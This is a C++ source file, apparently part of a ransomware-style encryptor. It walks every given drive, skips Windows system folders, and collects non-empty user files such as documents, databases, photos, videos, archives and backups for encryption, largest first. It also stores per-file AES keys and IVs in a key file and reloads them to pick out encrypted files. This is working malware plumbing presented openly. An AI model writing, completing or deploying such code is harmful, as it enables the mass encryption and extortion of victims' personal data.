//
// Created by prang on 25.09.2024.
//

#include "FileUtils.h"
#include <filesystem>
#include <algorithm>
#include <iostream>
#include <sstream>
#include <exception>
#include <stack>

namespace fs = std::filesystem;

std::vector<fs::path> FileUtils::listFiles(const std::vector<fs::path>& directoryList, const bool encryptionMode) {
  std::vector<fs::path> file_list;

  for (const auto& drive : directoryList) {
    try {
      // Check if the drive/path exists before iterating
      if (!fs::exists(drive)) {
        std::cerr << "Error: Directory does not exist: " << drive << std::endl;
        continue;
      }

      // Check if the path is a directory
      if (!fs::is_directory(drive)) {
        std::cerr << "Error: Path is not a directory: " << drive << std::endl;
        continue;
      }

      std::stack<fs::path> dirs; // Stack for directories
      dirs.push(drive); // Start with the initial drive

      while (!dirs.empty()) {
        fs::path current_dir = dirs.top(); // Get the current directory
        dirs.pop(); // Remove it from the stack

        try {
          // Check if the directory is accessible and not hidden
          if ((fs::status(current_dir).permissions() & fs::perms::owner_read) == fs::perms::none ||
              (fs::is_directory(current_dir) && fs::status(current_dir).permissions() == fs::perms::none)) {
            std::cerr << "Skipping inaccessible or hidden directory: " << current_dir << std::endl;
            continue;
          }

          // Iterate over the directory entries
          for (const auto& entry : fs::directory_iterator(current_dir)) {
            try {
              // Skip hidden directories and files
              if ((fs::status(entry).permissions() & fs::perms::owner_read) == fs::perms::none) {
                std::cerr << "Skipping hidden or inaccessible entry: " << entry.path() << std::endl;
                continue;
              }

              // Check if the path is valid
              if (!isValidPath(entry.path())) {
                continue; // Skip invalid paths
              }

              if (fs::is_directory(entry)) {
                dirs.push(entry.path()); // Push subdirectories onto the stack
              } else if (fs::is_regular_file(entry) && !isSystemCritical(entry.path()) &&
                         hasValidExtension(entry.path(), encryptionMode)) {
                // Check if the file has content (is not empty)
                if (fs::file_size(entry.path()) > 0) {
                  file_list.push_back(entry.path()); // Only add the file if it has content
                } else {
                  std::cerr << "Skipping empty file: " << entry.path() << std::endl;
                }
              }
            } catch (const fs::filesystem_error& e) {
              // Log the error and continue
              std::cerr << "Error accessing file: " << entry.path() << " -> " << e.what() << " (File system error)"
                        << std::endl;
              continue;
            } catch (const std::exception& e) {
              // Log the error and continue
              std::cerr << "Error accessing file: " << entry.path() << " -> " << e.what() << " (General error)"
                        << std::endl;
              continue;
            }
          }
        } catch (const fs::filesystem_error& e) {
          // Log the directory error and continue scanning
          std::cerr << "Filesystem error accessing directory: " << current_dir << " -> " << e.what() << std::endl;
          continue;
        } catch (const std::exception& e) {
          // Log the general error and continue scanning
          std::cerr << "General error accessing directory: " << current_dir << " -> " << e.what() << std::endl;
          continue;
        }
      }
    } catch (const fs::filesystem_error& e) {
      // Log the drive-level error and continue
      std::cerr << "Filesystem error accessing drive: " << drive << " -> " << e.what() << std::endl;
      continue;
    } catch (const std::exception& e) {
      // Log the general drive error and continue
      std::cerr << "General error accessing drive: " << drive << " -> " << e.what() << std::endl;
      continue;
    }
  }

  // Sort files by size
  std::sort(file_list.begin(), file_list.end(), [](const fs::path& a, const fs::path& b) {
    return fs::file_size(a) > fs::file_size(b);
  });

  return file_list;
}

bool FileUtils::isValidPath(const fs::path& p) {
  // Check if each character in the path is printable
  for (const auto& ch : p.string()) {
    if (!std::iswprint(ch)) {
      std::cerr << "Invalid character in path: " << p << std::endl;
      return false;
    }
  }
  return true;
}

bool FileUtils::isSystemCritical(const fs::path& file_path) {
  // Hole den Laufwerksbuchstaben des Pfades
  std::wstring driveLetter = file_path.root_name().wstring();

  // Liste der kritischen Pfade
  const std::vector<fs::path> critical_paths = {
      L"Windows",
      L"Program Files",
      L"Program Files (x86)",
      L"System Volume Information",
      L"$Recycle.Bin",
      L"PerfLogs",
      L"Boot"
  };

  // Vollständigen kritischen Pfad bilden und vergleichen
  for (const auto& critical_path : critical_paths) {
    fs::path fullCriticalPath = fs::path(driveLetter) / critical_path;

    // Überprüfen, ob der Dateipfad den kritischen Pfad enthält
    if (file_path.string().find(fullCriticalPath.string()) == 0) {
      return true; // Pfad ist kritisch
    }
  }

  return false; // Pfad ist nicht kritisch
}

bool FileUtils::hasValidExtension(const fs::path &filepath, const bool encryptionMode) {
  std::vector<fs::path> personalDataExtensions;

  if (encryptionMode) {
    personalDataExtensions = {
        ".txt", ".csv", ".xm", ".json", ".doc", ".docx", ".odt", ".rtf", ".wps", ".wpd", ".dot", ".dotx", ".pdf",
        ".xls", ".xlsx", ".ods", ".slk", ".dif",
        ".ppt", ".pptx", ".odp", ".pps", ".ppsx",
        ".db", ".sq", ".sqlite", ".mdb", ".accdb", ".dBase", ".fdb", ".ndf", ".mdf",
        ".jpg", ".jpeg", ".png", ".bmp", ".gif", ".tiff", ".svg", ".heic", ".raw", ".cr2", ".nef", ".orf", ".jfif",
        ".mp4", ".avi", ".mkv", ".mov", ".wmv", ".flv", ".mpeg", ".3gp", ".webm", ".mts", ".m2ts", ".vob", ".divx",
        ".mp3", ".wav", ".aac", ".flac", ".ogg", ".wma", ".m4a", ".opus", ".ra", ".aiff", ".amr",
        ".zip", ".rar", ".7z", ".tar", ".gz", ".bz2", ".xz", ".iso", ".dmg",
        ".yam", ".ini", ".log", ".cfg", ".bak", ".plist"
    };
  } else {
    personalDataExtensions = {ENC_FILE_SUFFIX};
  }

  // Get the extension of the file path
  fs::path extension = filepath.extension();

  // Check if the extension is in the vector of valid extensions
  return std::find(personalDataExtensions.begin(), personalDataExtensions.end(), extension) !=
         personalDataExtensions.end();
}

void FileUtils::saveCryptoData(const CryptoData &data) {
  std::wofstream outfile(KEY_IV_SAVE_FILE, std::ios::app); // Append if the file exists

  // Check if the file opened successfully
  if (!outfile.is_open()) {
    std::wcerr << L"Error opening file!" << std::endl; // Use std::wcerr for wide character output
    return;
  }

  // Write the encrypted path to the file using fs::path directly
  outfile << data.encryptedPath.c_str() << L'\n'; // Write the wide string directly

  // Write the key to the file
  for (const auto &byte: data.keyIvAES.key) {
    outfile << static_cast<int>(byte) << L' '; // Convert byte to int for storage
  }
  outfile << L'\n';

  // Write the IV to the file
  for (const auto &byte: data.keyIvAES.iv) {
    outfile << static_cast<int>(byte) << L' '; // Convert byte to int for storage
  }
  outfile << L'\n';

  outfile.close(); // Close the output file stream
}

std::vector<CryptoData> FileUtils::loadCryptoData() {
  std::vector<CryptoData> dataVector;
  std::wifstream infile(KEY_IV_SAVE_FILE); // Use wide input file stream

  // Check if the file exists and can be opened
  if (!infile.is_open()) {
    std::wcerr << L"The file could not be opened!" << std::endl;
    return dataVector; // Return an empty vector
  }

  // Ignoriere die erste Zeile (Header)
  std::wstring header;
  std::getline(infile, header); // Lese und ignoriere den Header

  CryptoData data;
  while (true) {
    // Read the encrypted path directly
    wchar_t pathBuffer[PATH_MAX]; // Create a buffer for the path
    infile.getline(pathBuffer, PATH_MAX); // Read the path into the buffer

    if (infile.eof()) break; // Exit if end of file is reached

    data.encryptedPath = fs::path(pathBuffer); // Assign the buffer to the fs::path

    // Read the key line
    wchar_t keyBuffer[1024]; // Buffer for the key line
    infile.getline(keyBuffer, 1024); // Read the key into the buffer

    if (infile.eof()) break; // Exit if end of file is reached

    // Read the IV line
    wchar_t ivBuffer[1024]; // Buffer for the IV line
    infile.getline(ivBuffer, 1024); // Read the IV into the buffer

    if (infile.eof()) break; // Exit if end of file is reached

    // Process key line
    std::wistringstream keyStream(keyBuffer);
    unsigned int byte;
    while (keyStream >> byte) {
      data.keyIvAES.key.push_back(static_cast<unsigned char>(byte));
    }

    // Process IV line
    std::wistringstream ivStream(ivBuffer);
    while (ivStream >> byte) {
      data.keyIvAES.iv.push_back(static_cast<unsigned char>(byte));
    }

    dataVector.push_back(data);
    data.keyIvAES.key.clear(); // Clear vector for the next entry
    data.keyIvAES.iv.clear();  // Clear vector for the next entry
  }

  infile.close();
  return dataVector;
}
